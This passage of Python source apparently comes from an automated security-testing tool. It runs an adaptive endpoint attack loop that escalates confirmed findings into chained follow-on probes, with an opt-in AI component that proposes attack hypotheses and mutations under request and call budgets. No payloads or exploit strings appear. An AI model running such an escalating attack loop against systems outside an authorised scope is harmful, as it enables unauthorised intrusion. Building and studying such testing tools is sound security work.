    queue = deque(seeds)
    seen = {(s.url, s.lane) for s in seeds}

    while queue:
        seed = queue.popleft()
        if not budget.can_spend() and seed.lane not in ("disclosure", "version-swap"):
            break
        steps, finding = run_endpoint(seed, scope, budget, fetch, cfg,
                                      baseline_cache, chat_fn, ai_budget)
        transcript.extend(steps)
        by_lane[seed.lane] = by_lane.get(seed.lane, 0) + 1
        if finding:
            findings.append(finding)
            prov = finding["arise_provenance"]
            if prov["confirmed"]:
                confirmed += 1
                if prov.get("proposed_by") == "ai":
                    ai_confirmed += 1
                if seed.depth > 0:
                    chain_confirmed += 1
                # P5 feedback edge: escalate on a confirmed finding
                for ns in _followon_seeds(seed, finding, seen, cfg.max_chain_depth):
                    queue.appendleft(ns)
                    chained_seeds += 1
            else:
                observed += 1
        else:
            refuted += 1

    (out_dir / "loop_findings.jsonl").write_text(
        "".join(json.dumps(f) + "\n" for f in findings))
    (out_dir / "loop_transcript.jsonl").write_text(
        "".join(json.dumps(s) + "\n" for s in transcript))

    summary = {
        "module": "adaptive_loop", "status": "completed", "target": target,
        "seeds_total": len(seeds), "seeds_chained": chained_seeds,
        "requests_spent": cfg.max_requests - budget.remaining,
        "requests_budget": cfg.max_requests,
        "findings_total": len(findings), "confirmed": confirmed,
        "observed": observed, "refuted_seeds": refuted,
        "chain_confirmed": chain_confirmed,
        "ai": ai_note,
        "ai_calls_spent": (cfg.ai_max_calls - ai_budget.remaining) if ai_budget else 0,
        "ai_confirmed": ai_confirmed,
        "by_lane": by_lane,
        "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
    }
    (out_dir / "loop_summary.json").write_text(json.dumps(summary, indent=2))
    print(f"adaptive_loop: seeds={len(seeds)}(+{chained_seeds} chained) confirmed={confirmed} "
          f"(ai={ai_confirmed} chain={chain_confirmed}) observed={observed} refuted={refuted} "
          f"requests={summary['requests_spent']}/{cfg.max_requests} ai={ai_note}")
    return summary


def _infer_target(sp: Path) -> str:
    name = sp.name
    m = re.match(r"([a-z0-9.-]+?)-\d{6}-\d{4}$", name)
    return m.group(1) if m else ""


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    ap = argparse.ArgumentParser(description="ARISE Adaptive Endpoint Attack Loop (P3 deterministic + P4 AI)")
    ap.add_argument("scan_dir", nargs="?")
    ap.add_argument("--target", default="")
    ap.add_argument("--max-requests", type=int, default=300)
    ap.add_argument("--per-endpoint", type=int, default=8)
    ap.add_argument("--max-seeds", type=int, default=200)
    ap.add_argument("--budget", type=int, default=600)
    ap.add_argument("--timeout", type=int, default=8)
    ap.add_argument("--ai", action="store_true", help="enable the P4 AI hypothesis/mutation brain (opt-in)")
    ap.add_argument("--ai-provider", default="", help="claude | openai | gemini (default from env)")
    ap.add_argument("--ai-model", default="")
    ap.add_argument("--ai-max-calls", type=int, default=40, help="global cap on model calls")
    ap.add_argument("--summary", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()

    if args.selftest:
        return _selftest()
    if not args.scan_dir:
        ap.error("scan_dir is required (or use --selftest)")

    cfg = LoopConfig(max_requests=args.max_requests, per_endpoint=args.per_endpoint,
                     max_seeds=args.max_seeds, budget_s=args.budget, timeout=args.timeout,
                     ai_enabled=args.ai, ai_provider=args.ai_provider,
                     ai_model=args.ai_model, ai_max_calls=args.ai_max_calls)
    summary = run_adaptive_loop(args.scan_dir, target=args.target, cfg=cfg)
    if args.summary:
        print(json.dumps(summary, indent=2))
    return 0


def _selftest() -> int:
    """Offline FSM check with a scripted fetcher — a vulnerable target confirms,
    a safe one refutes. No network."""
    print("adaptive_loop selftest is in tests/test_adaptive_loop.py")
    return 0


if __name__ == "__main__":
    sys.exit(main())
